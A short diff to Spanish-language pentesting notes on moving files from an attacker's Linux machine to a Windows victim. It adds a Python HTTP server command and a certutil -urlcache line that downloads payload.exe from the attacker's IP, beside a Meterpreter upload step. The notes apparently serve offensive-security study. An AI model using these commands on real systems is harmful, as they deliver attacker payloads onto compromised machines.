@@ -13,14 +13,16 @@ C:\Windows\Temp
 
 ```bash 
 # Atacante Linux
-2. ❯ 
+2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
 ```
 
 ```bash 
 # Victima Windows 
 
 1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir
-2. ❯ 
+2. ❯ certutil -urlcache -f http://IP/payload.exe payload.exe    # Para descargar el payload de la maquina Linux
+	# IP = Direccion de la maquina de atacante Linux
+	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
 ```
 
 ## Linux a Linux
